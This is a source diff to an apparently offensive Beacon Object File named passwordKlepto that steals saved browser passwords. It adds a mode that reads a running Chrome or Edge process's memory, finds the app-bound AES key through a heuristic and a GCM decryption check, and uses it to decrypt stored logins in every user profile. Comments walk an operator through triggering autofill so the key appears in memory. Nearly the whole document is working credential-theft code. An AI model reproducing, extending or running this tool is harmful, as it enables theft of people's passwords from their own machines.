@@ -56,6 +56,10 @@ WINBASEAPI BOOL WINAPI KERNEL32$GetOverlappedResult(HANDLE hFile, LPOVERLAPPED l
 #define CSIDL_LOCAL_APPDATA 0x001c
 #define CSIDL_APPDATA        0x001a
 #define MAX_CAND_KEYS 8
+/* -scan mode: scan an already-running browser's memory for the v20 app-bound key */
+#define SCAN_MAX_REGION   (4*1024*1024)   /* max RW region size we ReadProcessMemory */
+#define SCAN_TIMEOUT_MS   30000           /* overall scan cap (ms) — matches lab extractor */
+#define V20_BLOB_CAP      4096            /* max v20 password_value blob we capture */
 
 /* forward decl: apply_wal (helpers section) needs be32, defined later in the
  * SQLite reader section. */
@@ -1307,8 +1311,183 @@ typedef struct {
     const char *subPath;   /* "\\Google\\Chrome\\User Data" or "\\Microsoft\\Edge\\User Data" */
     DWORD browserPid;
     int doV20;
+    int scanMode;          /* --scan: recover v20 key from a running browser's memory */
     int userFound;
 } CrEnumCtx;
+
+/* ----------------------------------------------------------------------
+ *  -scan mode helpers — recover the v20 app-bound AES key by reading it out
+ *  of an already-running chrome.exe/msedge.exe's memory (the std-user path,
+ *  no SYSTEM / no hollowing / no child process). The key only lands in the
+ *  browser process's RAM once Chrome autofills a saved v20 login (which forces
+ *  the app-bound decryption); the operator ensures that by opening the saved
+ *  login page, then runs `passwordKlepto -b chrome --scan [-p pid]`. We scan
+ *  committed RW regions for a 32-byte window that (a) looks like a key and
+ *  (b) GCM-decrypts a v20 Login Data blob (the existing tag oracle). Ported
+ *  from the OSAI Pipeline Breach T10 abe_login_extractor (xaitax memory
+ *  analysis), lab-validated. MITRE T1555.003.
+ * -------------------------------------------------------------------- */
+
+/* plausible-AES-key heuristic: high byte diversity, few 0x00/0xFF runs.
+ * Adapted from abe_login_extractor.cpp::LooksLikeKey, but uses an O(n^2)
+ * duplicate scan instead of a 256-byte tracking array — avoids any memset
+ * libcall (the Creds-BOF CFLAGS has no -fno-tree-loop-distribute-patterns). */
+static int looks_like_key(const unsigned char *p) {
+    int unique = 0, zeros = 0, ffs = 0, i, j, dup;
+    for (i = 0; i < 32; i++) {
+        unsigned char b = p[i];
+        if (b == 0x00) zeros++;
+        if (b == 0xFF) ffs++;
+        dup = 0;
+        for (j = 0; j < i; j++) if (p[j] == b) { dup = 1; break; }
+        if (!dup) unique++;
+    }
+    if (unique < 20) return 0;
+    if (zeros > 4 || ffs > 4) return 0;
+    return 1;
+}
+
+/* scan one process's committed RW regions (<= SCAN_MAX_REGION) for a 32-byte
+ * key that GCM-decrypts the v20 validation blob (nonce@+3, ct@+15, tag@end-16).
+ * Returns 1 and copies 32 bytes into outKey on success. */
+static int scan_proc_for_key(DWORD pid, const unsigned char *blob, int blobLen,
+                             unsigned char *outKey, DWORD deadlineTick) {
+    HANDLE hProc;
+    SYSTEM_INFO si;
+    MEMORY_BASIC_INFORMATION mbi;
+    unsigned char *buf;
+    unsigned char *addr;
+    const unsigned char *nonce, *ct, *tag;
+    DWORD ctLen;
+
+    if (blobLen < 32) return 0;   /* need v20(3)+nonce(12)+ct(>=1)+tag(16) */
+    hProc = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProc) return 0;
+
+    KERNEL32$GetSystemInfo(&si);
+    addr = (unsigned char *)si.lpMinimumApplicationAddress;
+    buf = (unsigned char *)intAlloc(SCAN_MAX_REGION);
+    if (!buf) { KERNEL32$CloseHandle(hProc); return 0; }
+
+    nonce = blob + 3;
+    ct    = blob + 15;
+    ctLen = (DWORD)blobLen - 15 - 16;
+    tag   = blob + blobLen - 16;
+
+    while (addr < (unsigned char *)si.lpMaximumApplicationAddress) {
+        if (KERNEL32$GetTickCount() >= deadlineTick) break;
+        if (KERNEL32$VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == 0) {
+            addr += 0x1000; continue;
+        }
+        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE &&
+            mbi.RegionSize <= SCAN_MAX_REGION) {
+            SIZE_T got = 0;
+            if (KERNEL32$ReadProcessMemory(hProc, mbi.BaseAddress, buf,
+                                           (SIZE_T)mbi.RegionSize, &got) && got >= 32) {
+                SIZE_T i;
+                for (i = 0; i + 32 <= got; i += 8) {
+                    BOOL ok = FALSE; DWORD olen = 0;
+                    unsigned char *plain;
+                    if (!looks_like_key(buf + i)) continue;
+                    plain = AesGcmDecrypt(buf + i, nonce, ct, ctLen, tag, &olen, &ok, 0);
+                    if (plain) intFree(plain);
+                    if (ok) {
+                        MSVCRT$memcpy(outKey, buf + i, 32);
+                        intFree(buf);
+                        KERNEL32$CloseHandle(hProc);
+                        return 1;
+                    }
+                }
+            }
+        }
+        addr = (unsigned char *)mbi.BaseAddress + mbi.RegionSize;
+    }
+    intFree(buf);
+    KERNEL32$CloseHandle(hProc);
+    return 0;
+}
+
+/* scan a given pid (if != 0) else every chrome.exe/msedge.exe pid, for the key.
+ * SCAN_TIMEOUT_MS overall cap. Returns 1 + fills outKey on success. */
+static int scan_browser_memory(DWORD scanPid, const char *browser,
+                               const unsigned char *blob, int blobLen,
+                               unsigned char *outKey) {
+    DWORD deadline = KERNEL32$GetTickCount() + SCAN_TIMEOUT_MS;
+    const char *procName = (MSVCRT$strcmp(browser, "msedge") == 0) ? "msedge.exe" : "chrome.exe";
+
+    if (scanPid) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] scan: target %s pid %lu", browser, (unsigned long)scanPid);
+        return scan_proc_for_key(scanPid, blob, blobLen, outKey, deadline);
+    }
+    {
+        HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        PROCESSENTRY32 pe;
+        int scanned = 0;
+        if (hSnap == INVALID_HANDLE_VALUE) return 0;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+        if (KERNEL32$Process32First(hSnap, &pe)) {
+            do {
+                if (KERNEL32$GetTickCount() >= deadline) break;
+                if (MSVCRT$strcmp(pe.szExeFile, procName) == 0) {
+                    scanned++;
+                    if (scan_proc_for_key(pe.th32ProcessID, blob, blobLen, outKey, deadline)) {
+                        KERNEL32$CloseHandle(hSnap);
+                        return 1;
+                    }
+                }
+            } while (KERNEL32$Process32Next(hSnap, &pe));
+        }
+        KERNEL32$CloseHandle(hSnap);
+        if (!scanned) BeaconPrintf(CALLBACK_ERROR, "[!] scan: no running %s process found", procName);
+    }
+    return 0;
+}
+
+/* v20-blob capture: walk `logins` once to grab the first v20 password_value,
+ * used as the oracle validation target for the memory scan. */
+typedef struct { unsigned char *blob; int len, cap, iPass; } V20CapCtx;
+static void v20_capture_cb(Col *cols, int ncol, void *ctx) {
+    V20CapCtx *v = (V20CapCtx *)ctx;
+    if (v->len) return;
+    if (v->iPass >= 0 && v->iPass < ncol &&
+        (cols[v->iPass].isBlob || cols[v->iPass].isText) && cols[v->iPass].len >= 15 &&
+        MSVCRT$memcmp(cols[v->iPass].ptr, "v20", 3) == 0) {
+        int n = (cols[v->iPass].len < v->cap) ? cols[v->iPass].len : v->cap;
+        MSVCRT$memcpy(v->blob, cols[v->iPass].ptr, n);
+        v->len = n;
+    }
+}
+static int capture_first_v20(const char *base, unsigned char *out, int cap, int *outLen) {
+    WIN32_FIND_DATAA fd; HANDLE hFind;
+    char searchPath[MAX_PATH], profilePath[MAX_PATH];
+    static const char *loginFiles[2] = { "Login Data", "Login Data For Account" };
+    int found = 0;
+    MSVCRT$_snprintf(searchPath, sizeof(searchPath), "%s\\*", base);
+    hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return 0;
+    do {
+        int lf;
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+        if (fd.cFileName[0] == '.') continue;
+        if (MSVCRT$strcmp(fd.cFileName, "Default") != 0 &&
+            MSVCRT$_strnicmp(fd.cFileName, "Profile", 7) != 0) continue;
+        for (lf = 0; lf < 2 && !found; lf++) {
+            DWORD sz = 0, root = 0; char *db; ColMap m;
+            MSVCRT$_snprintf(profilePath, sizeof(profilePath), "%s\\%s\\%s", base, fd.cFileName, loginFiles[lf]);
+            db = ReadDbWithWal(profilePath, &sz);
+            if (!db) continue;
+            if (sqlite_map_cols((unsigned char *)db, sz, "logins",
+                                "origin_url", "username_value", "password_value", &root, &m)) {
+                V20CapCtx v; v.blob = out; v.cap = cap; v.len = 0; v.iPass = m.i2;
+                sqlite_walk_root((unsigned char *)db, sz, root, v20_capture_cb, &v);
+                if (v.len) { *outLen = v.len; found = 1; }
+            }
+            intFree(db);
+        }
+    } while (KERNEL32$FindNextFileA(hFind, &fd));
+    KERNEL32$FindClose(hFind);
+    return found;
+}
 
 /* per-user callback: build keys from THAT user's Local State, then decrypt each
  * of their profiles' Login Data. Keys are per-user (each user has their own
@@ -1336,7 +1515,28 @@ static void chromium_user_cb(const char *profA, void *ctx) {
     cx.iHost = cx.iCName = cx.iEnc = -1;
 
     BeaconPrintf(CALLBACK_OUTPUT, "===== %s @ %s : building keys from %s =====", e->browser, profA, localState);
-    BuildChromiumKeys(&cx, localState, e->browser, e->browserPid, e->doV20);
+    if (e->scanMode) {
+        /* std-user path: v10 DPAPI still works as the user; skip the v20 hollow
+         * (needs SYSTEM) and instead recover the v20 key from browser memory. */
+        unsigned char *v20blob = (unsigned char *)intAlloc(V20_BLOB_CAP);
+        int v20len = 0;
+        BuildChromiumKeys(&cx, localState, e->browser, e->browserPid, 0);   /* v10 only */
+        if (v20blob && capture_first_v20(base, v20blob, V20_BLOB_CAP, &v20len) && v20len >= 32) {
+            unsigned char scanKey[32];
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] scan: validating vs %d-byte v20 Login Data blob; scanning %s memory (<=30s)...", v20len, e->browser);
+            if (scan_browser_memory(e->browserPid, e->browser, v20blob, v20len, scanKey)) {
+                add_key(&cx, scanKey);
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] scan: recovered v20 app-bound key from %s memory (added as candidate)", e->browser);
+            } else {
+                BeaconPrintf(CALLBACK_ERROR, "[!] scan: no key in %s memory. Ensure %s is running and has autofilled a saved v20 login (open the saved login page), then retry.", e->browser, e->browser);
+            }
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[!] scan: no v20 Login Data blob at %s to validate against", base);
+        }
+        if (v20blob) intFree(v20blob);
+    } else {
+        BuildChromiumKeys(&cx, localState, e->browser, e->browserPid, e->doV20);
+    }
     if (cx.nKeys == 0) {
         BeaconPrintf(CALLBACK_ERROR, "[!] %s @ %s: no decryption keys available — skipping", e->browser, profA);
         return;
@@ -1409,9 +1609,9 @@ static void chromium_user_cb(const char *profA, void *ctx) {
 }
 
 /* decrypt stored passwords for a Chromium browser across every user profile. */
-static void ProcessChromium(const char *browser, const char *subPath, DWORD browserPid, int doV20) {
+static void ProcessChromium(const char *browser, const char *subPath, DWORD browserPid, int doV20, int scanMode) {
     CrEnumCtx ec;
-    ec.browser = browser; ec.subPath = subPath; ec.browserPid = browserPid; ec.doV20 = doV20; ec.userFound = 0;
+    ec.browser = browser; ec.subPath = subPath; ec.browserPid = browserPid; ec.doV20 = doV20; ec.scanMode = scanMode; ec.userFound = 0;
     ForEachUserProfile(chromium_user_cb, &ec);
     if (!ec.userFound) BeaconPrintf(CALLBACK_OUTPUT, "[*] %s: no user with a decryptable Local State found", browser);
 }
@@ -1777,7 +1977,7 @@ static void ProcessFirefox(DWORD unused) {
 void go(char *args, int alen) {
     datap parser;
     char *browser, *profileOverride;
-    int browserPid, doV20, doFirefox;
+    int browserPid, doV20, doFirefox, scanMode;
     char chromeUD[MAX_PATH], edgeUD[MAX_PATH];
 
     BeaconDataParse(&parser, args, alen);
@@ -1786,27 +1986,28 @@ void go(char *args, int alen) {
     browserPid     = BeaconDataInt(&parser);
     doV20          = BeaconDataInt(&parser);
     doFirefox      = BeaconDataInt(&parser);
+    scanMode       = BeaconDataInt(&parser);
     (void)profileOverride;   /* reserved for a future custom-profile-path mode */
 
     MSVCRT$_snprintf(chromeUD, sizeof(chromeUD), "\\Google\\Chrome\\User Data");
     MSVCRT$_snprintf(edgeUD,   sizeof(edgeUD),   "\\Microsoft\\Edge\\User Data");
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] passwordKlepto: browser='%s' pid=%lu v20=%d ff=%d",
-                 browser ? browser : "(all)", (unsigned long)browserPid, doV20, doFirefox);
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] passwordKlepto: browser='%s' pid=%lu v20=%d ff=%d scan=%d",
+                 browser ? browser : "(all)", (unsigned long)browserPid, doV20, doFirefox, scanMode);
 
     if (browser && MSVCRT$strlen(browser) > 0) {
         if (MSVCRT$strcmp(browser, "firefox") == 0) {
             ProcessFirefox(0);
             return;
         }
-        if (MSVCRT$strcmp(browser, "chrome") == 0) { ProcessChromium("chrome", chromeUD, browserPid, doV20); return; }
-        if (MSVCRT$strcmp(browser, "msedge") == 0) { ProcessChromium("msedge", edgeUD,   browserPid, doV20); return; }
+        if (MSVCRT$strcmp(browser, "chrome") == 0) { ProcessChromium("chrome", chromeUD, browserPid, doV20, scanMode); return; }
+        if (MSVCRT$strcmp(browser, "msedge") == 0) { ProcessChromium("msedge", edgeUD,   browserPid, doV20, scanMode); return; }
         BeaconPrintf(CALLBACK_ERROR, "[!] unknown browser '%s' (use chrome|msedge|firefox)", browser);
         return;
     }
 
-    /* no browser specified -> all three */
-    ProcessChromium("chrome", chromeUD, browserPid, doV20);
-    ProcessChromium("msedge", edgeUD,   browserPid, doV20);
+    /* no browser specified -> all three (scan applies to chromium only) */
+    ProcessChromium("chrome", chromeUD, browserPid, doV20, scanMode);
+    ProcessChromium("msedge", edgeUD,   browserPid, doV20, scanMode);
     if (doFirefox) ProcessFirefox(0);
 }
